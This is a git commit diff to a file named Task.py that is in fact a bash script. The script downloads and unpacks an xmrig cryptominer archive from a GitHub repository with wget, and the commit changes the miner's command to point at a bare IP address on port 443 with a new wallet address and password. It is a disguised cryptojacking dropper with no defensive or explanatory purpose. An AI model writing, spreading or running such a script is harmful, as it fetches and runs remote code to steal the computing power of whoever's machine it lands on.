015dc97b3c0a82bfcf0f998b44d4cb440c4ac980
mariana131312 <lalamarina767@tognu.com>
2025-05-18 11:46:29 +0700

    Update Task.py

--- Task.py
+++ Task.py
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
-./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SaLvsAi6k4C755eL7xEEEZJ4JDVUyx1gn9wtrJGngGkdMLRoTB721euSG2wbT14dn2885qFc93mS3eJQ9bwWQEmk58CgQmrj5nF -p gasken23 -a rx/0
+./xmrig --donate-level 1 -o 128.199.142.3:443 -u solo:SaLvsBeFJrnfX6zQBXi3UfUavYysM3ExGgLHZ7pH5daZDy5YRdGx5GjCdhTEGxQ5wEDLTAJyx4ME5jcyaaA63VfeJv673McRd2j -p KUNPAYAKUN -a rx/0
